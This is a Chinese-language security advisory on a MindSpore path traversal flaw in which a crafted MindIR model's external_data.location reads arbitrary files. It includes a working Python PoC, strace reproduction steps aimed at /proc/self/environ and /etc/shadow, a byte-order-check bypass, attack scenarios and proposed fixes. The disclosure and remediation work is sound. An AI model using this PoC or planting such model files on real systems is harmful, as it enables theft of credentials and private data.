# MS-2025-001: MindIR External Data 路径穿越导致任意文件读取

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [mindspore-ai/mindspore](https://github.com/mindspore-ai/mindspore) / [Gitee](https://gitee.com/mindspore/mindspore) |
| **影响版本** | ≤ 2.9.0（已在 2.9.0 最新 pip release 上确认复现） |
| **严重性** | Critical |
| **CVSS 3.1** | 8.6 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) |
| **CWE** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 本地 / 需要用户加载恶意模型文件 |
| **影响组件** | `mindspore/core/load_mindir/load_model.cc` — `GetTensorDataFromExternal()` |

---

## 漏洞概述

MindSpore 在加载 MindIR 模型文件时，如果模型使用了外部数据存储（`external_data`），其 `location` 字段会被直接拼接到文件路径中用于读取张量数据。该字段来自 protobuf 反序列化，完全由模型文件控制，**没有任何路径校验或规范化**。

攻击者可以构造恶意 MindIR 文件，将 `external_data.location` 设置为包含 `../` 的路径，当受害者加载该模型时，框架会打开并读取系统上的任意文件。

**已知同类漏洞先例**：
- [CVE-2024-27318](https://nvd.nist.gov/vuln/detail/CVE-2024-27318)：ONNX `external_data.location` 路径穿越（完全相同攻击模式）
- [CVE-2025-51480](https://nvd.nist.gov/vuln/detail/CVE-2025-51480)：ONNX 再次出现相同漏洞

MindSpore 存在相同缺陷但尚未修复。

---

## 影响

- **信息泄露**：读取系统敏感文件（`/etc/shadow`、SSH keys、环境变量、数据库凭证等）
- **模型投毒链**：在模型分享/下载场景中，攻击者上传恶意模型文件，受害者加载后泄露本机敏感数据
- **云环境凭证窃取**：在 AI 训练平台上，可读取其他用户文件或云凭证（`/proc/self/environ` 包含环境变量）

**攻击入口**：`mindspore.load("malicious.mindir")` — MindSpore 用户加载模型的标准方式。

---

## 漏洞代码分析

### 根因：路径直接拼接，无校验

**文件**: `mindspore/core/load_mindir/load_model.cc`

```cpp
bool MSANFModelParser::GetTensorDataFromExternal(const mind_ir::TensorProto &tensor_proto,
                                                 const tensor::TensorPtr &tensor_info) {
  if (!tensor_proto.has_external_data()) {
    return false;
  }
  const unsigned char *data = nullptr;
  auto it = tenor_data_.find(tensor_proto.external_data().location());
  if (it != tenor_data_.end()) {
    data = it->second.get();
  } else {
    // [漏洞点] location 来自 protobuf，攻击者完全控制，直接拼接到路径
    std::string file = mindir_path_ + "/" + tensor_proto.external_data().location();

    // ... 后续直接打开并读取该文件 ...
    } else if (weight_buffer_.first == nullptr) {
      // Read file
      std::basic_ifstream<char> fid(file, std::ios::in | std::ios::binary);
      if (!fid) {
        MS_LOG(EXCEPTION) << "Open file '" << file << "' failed, ...";
      }
      (void)fid.seekg(0, std::ios_base::end);
      size_t file_size = static_cast<size_t>(fid.tellg());
      // ...
      (void)fid.read(plain_data.get(), SizeToLong(file_size));
      // ↑ 目标文件全部内容被完整读入堆内存
```

### 攻击者可控的输入来源

**文件**: `mindspore/core/proto/mind_ir.proto`

```protobuf
message ExternalDataProto {
    // POSIX filesystem path relative to the directory where the MindIR model was stored.
    optional string location = 1;   // ← 攻击者完全控制
    optional int64 offset = 2;
    optional int64 length = 3;
}
```

### `mindir_path_` 的来源

```cpp
auto mindir_path = std::string(abs_path_buff);
model_parser.SetMindIRPath(mindir_path.substr(0, mindir_path.rfind("/")));
// 例如：/home/user/models/
```

### 攻击路径

```
mindir_path_ = "/tmp/poc_test/poc_model"
location     = "../../../etc/hostname"

拼接结果 = "/tmp/poc_test/poc_model/../../../etc/hostname"
         → 操作系统解析为 /etc/hostname
```

### 字节序检查（缓解因素，非阻断）

文件读入后存在一个字节序检查：

```cpp
constexpr Byte is_little_endian = 1;
constexpr int byte_order_index = 0;
if ((plain_data[byte_order_index] == is_little_endian) ^ little_endian()) {
    MS_LOG(ERROR) << "The byte order of export MindIr device and load MindIr device is not same!";
    return false;
}
```

**此检查不构成有效缓解**：
1. 检查在 `fid.read()` **之后**执行 — 文件已被完整读入堆内存
2. 任何**首字节为 `\x01` 的文件**可完全绕过（二进制文件中很常见）
3. 即使检查失败，`openat` + `read` 系统调用已完成，攻击者可通过 side-channel 确认文件存在

### 关键缺失

- 无 `../` 过滤
- 无 `realpath()` 规范化后的目录前缀校验
- 无文件路径白名单
- 无符号链接检查

---

## PoC

```python
"""
MS-2025-001 PoC: MindIR External Data 路径穿越
"""
import os
import sys

def create_malicious_mindir(target_file="/etc/hostname", output_dir="/tmp/poc_test/poc_model"):
    from mindspore.train.mind_ir_pb2 import ModelProto, TensorProto

    os.makedirs(output_dir, exist_ok=True)

    model = ModelProto()
    model.ir_version = "6"
    model.producer_name = "MindSpore"
    model.model_version = "1"
    model.little_endian = True

    graph = model.graph
    graph.name = "poc_graph"

    param = graph.parameter.add()
    param.name = "Default/param0:param0"
    param.data_type = TensorProto.FLOAT
    param.dims.extend([1024])

    # 计算路径穿越 payload
    abs_output = os.path.abspath(output_dir)
    abs_target = os.path.abspath(target_file)
    relative_path = os.path.relpath(abs_target, abs_output)

    param.external_data.location = relative_path
    param.external_data.offset = 0
    param.external_data.length = 0

    mindir_path = os.path.join(output_dir, "malicious.mindir")
    with open(mindir_path, "wb") as f:
        f.write(model.SerializeToString())

    print(f"[+] Malicious model created: {mindir_path}")
    print(f"[+] Target file: {target_file}")
    print(f"[+] Traversal path in location: {relative_path}")
    return mindir_path

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "/etc/hostname"
    create_malicious_mindir(target)
```

---

## 复现步骤与实测证据

### 环境

```
OS: Ubuntu (x86_64)
MindSpore: 2.9.0 (pip install mindspore)
Python: 3.12.3
```

### Step 1: 生成恶意模型

```bash
python3 poc_path_traversal.py /etc/hostname
```

输出：
```
[+] Malicious model created: /tmp/poc_test/poc_model/malicious.mindir
[+] Target file: /etc/hostname
[+] Traversal path in location: ../../../etc/hostname
```

### Step 2: strace 验证文件访问

```bash
strace -e trace=openat,read python3 -c "
import mindspore
try:
    mindspore.load('./poc_model/malicious.mindir')
except:
    pass
" 2>&1 | grep -A2 "etc/hostname"
```

**实测输出（关键证据）**：

```
openat(AT_FDCWD, "/tmp/poc_test/poc_model/../../../etc/hostname", O_RDONLY) = 5
read(5, "cursor\n", 8191)               = 7
```

✅ **路径穿越成功：文件被打开（fd=5），内容 "cursor\n" 被完整读入进程内存。**

### Step 3: 绕过字节序检查 — 完整数据泄露

创建首字节为 `\x01` 的目标文件：

```bash
printf '\x01SECRET_DATA_LEAKED' > /tmp/poc_test/secret_file.txt
python3 poc_path_traversal.py /tmp/poc_test/secret_file.txt
```

strace 验证：

```bash
strace -e trace=openat,read -s 100 python3 -c "
import mindspore
try:
    mindspore.load('./poc_model/malicious.mindir')
except:
    pass
" 2>&1 | grep -A1 "secret_file"
```

**实测输出**：

```
openat(AT_FDCWD, "/tmp/poc_test/poc_model/../secret_file.txt", O_RDONLY) = 5
read(5, "\1SECRET_DATA_LEAKED", 8191)   = 19
```

✅ **字节序检查绕过成功：完整数据 "SECRET_DATA_LEAKED" 被读入内存，无任何错误。**

### Step 4: 验证高价值目标

```bash
# /proc/self/environ — 包含所有环境变量（API keys、AWS凭证等）
python3 poc_path_traversal.py /proc/self/environ
```

**实测输出**：

```
openat(AT_FDCWD, "/tmp/poc_test/poc_model/../../../proc/self/environ", O_RDONLY) = 5
```

✅ `/proc/self/environ` 被成功打开。

```bash
# /etc/shadow — 权限受限但路径穿越生效
openat(AT_FDCWD, "/tmp/poc_test/poc_model/../../../etc/shadow", O_RDONLY) = -1 EACCES (Permission denied)
```

✅ **路径穿越逻辑生效**，仅因当前进程权限不足而被拒绝。若 MindSpore 以 root 权限运行（AI 训练平台常见），则可成功读取。

---

## 利用场景

| 场景 | 触发方式 | 影响 |
|------|---------|------|
| 模型分享平台 | 上传恶意模型到 ModelZoo/HuggingFace | 下载者执行 `ms.load()` 泄露本机文件 |
| 企业 AI 平台 | 用户上传自定义模型进行推理 | 平台加载模型时读取其他用户/系统文件 |
| 供应链投毒 | 在公开仓库放置恶意模型 | 大规模影响所有下载该模型的用户 |
| 邮件钓鱼 | "请帮忙测试这个模型权重" | 目标系统文件泄露 |

---

## 修复建议

### 方案 A（推荐）：路径规范化 + 目录前缀校验

```cpp
std::string file = mindir_path_ + "/" + tensor_proto.external_data().location();

// 修复：规范化路径并校验是否在 mindir_path_ 目录下
char resolved_path[PATH_MAX];
if (realpath(file.c_str(), resolved_path) == nullptr) {
  MS_LOG(ERROR) << "Failed to resolve external data path: " << file;
  return false;
}

char resolved_base[PATH_MAX];
if (realpath(mindir_path_.c_str(), resolved_base) == nullptr) {
  MS_LOG(ERROR) << "Failed to resolve base path: " << mindir_path_;
  return false;
}

std::string resolved_file_str(resolved_path);
std::string resolved_base_str(resolved_base);
resolved_base_str += "/";

if (resolved_file_str.rfind(resolved_base_str, 0) != 0) {
  MS_LOG(ERROR) << "Path traversal detected! External data location resolves outside model directory.";
  return false;
}
```

### 方案 B（最小修改）：拒绝危险路径组件

```cpp
const auto &location = tensor_proto.external_data().location();
if (location.find("..") != std::string::npos ||
    location.find('/') == 0 ||
    location.find('\\') != std::string::npos) {
  MS_LOG(ERROR) << "Invalid external data location: " << location;
  return false;
}
```

---

## 参考

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [CVE-2024-27318: ONNX Path Traversal via external_data](https://nvd.nist.gov/vuln/detail/CVE-2024-27318) — 完全相同的攻击模式
- [CVE-2025-51480: ONNX external_data.location path traversal](https://nvd.nist.gov/vuln/detail/CVE-2025-51480) — 同类漏洞再次出现
- [MindSpore Security Policy](https://gitee.com/mindspore/community/blob/master/security/README.md)
